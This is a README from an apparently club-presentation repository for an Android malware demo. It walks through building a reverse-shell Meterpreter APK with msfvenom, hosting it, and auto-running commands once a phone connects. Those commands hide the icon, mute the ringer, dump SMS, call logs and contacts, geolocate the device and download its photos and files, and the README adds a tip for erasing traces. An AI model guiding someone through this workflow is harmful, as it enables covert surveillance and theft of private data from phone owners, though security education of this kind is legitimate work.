# RITSECAndroidMalware
*Developed for a presentation at RIT's first RITSEC club meeting of the 2021-2022 school year*

## Instructions
1. Download the files
2. Create a subdirectory for the loot
3. Run the full demo or listener script from the subdirectory
`hacker@system:~/Hacks/Android/Loot$ ../androidMalwareDemoPub.sh`
4. Install apk on device
5. Collect data ez

## Some stuff you should change
- lhost variable in the full demo script
- lhost value in the listener script
- the name of the outputted apk

## Some stuff you might want to change
- the order of the commands in the rc file based on your priorities
- where the file is copied to based on what you are hosting
- what webserver service is restarted
- the lport variable in the full demo script
- the lport value in the listener script

## What each file does

The [androidMalwareDemoPub.sh](https://raw.githubusercontent.com/MeepStryker/RITSECAndroidMalware/main/androidListenerPub.sh) script uses msfvenom to create a reverse tcp meterpreter shell on an android device
- It outputs the payload to the parent directory
- It copies the payload to /var/www/html and restarts apache2 to allow easy access to the payload
- It then opens msfconsole and automatically sets the handler, payload, local host & port, and sets up an autorunscript to execute commands once a device connects
 
The [cmd_pub.rc](https://raw.githubusercontent.com/MeepStryker/RITSECAndroidMalware/main/cmd_pub.rc) file defines the commands that will be run as soon as the device establishes a meterpreter connection
- hide_app_icon - hides the payload's icon from the home screen (doesn't work on newer android versions)
- set_audio_mode -m 0 - turns off the ringer
- sysinfo - get information about the device
- getuid - get information about the device
- app_list - list installed applications
- check_root - check if the device is rooted
- ifconfig - get information about interfaces
- dump_sms - dumps all sms messages
- dump_calllog - dumps all call logs
- dump_contacts - dumps all contacts (doesn't work well on newer devices)
- geolocate - attempts to locate phone (does not work if gps is off) [can substitute/add wlan_geolocate if you have an api key]
- send_sms -d  -t "You pwned me!" - notifies the attacker that they have pwned someone (not strictly necessary)
- download /sdcard/Download/* - downloads all files in the Download folder
- download /sdcard/DCIM/Screenshots/* - downloads all screenshots
- download /sdcard/DCIM/Camera/* - downloads all photos

On modern android phones it is very difficult to establish persistence, so commands that will take a while are left for the end
- You can change this order to suit your priorities
- These commands aim to get as much useful data as possible in the least amount of time
- You can also delete the file from the downloads folder to hide that you were there. Just add rm /sdcard/Download/\[apk name\]

The [androidListenerPub.sh](https://raw.githubusercontent.com/MeepStryker/RITSECAndroidMalware/main/androidListenerPub.sh) script allows you to start listening for sessions if you already have the payload developed/hosted/etc.
It also loads the commands to run as soon as a device connects.  
`hacker@system:~/Hacks/Android/Loot$ ../androidListener.sh`  

[Slides](https://docs.google.com/presentation/d/1cw1hS7ZK4Oir515w1Ae54i-s9ck8eSC38oMcID8EPxI/edit?usp=sharing)
[Presentation Video](https://www.youtube.com/watch?v=SkMjpoTPeBQ)
  
 \
 \
**Thanks for the invite k4gu7uch1, it means a lot**
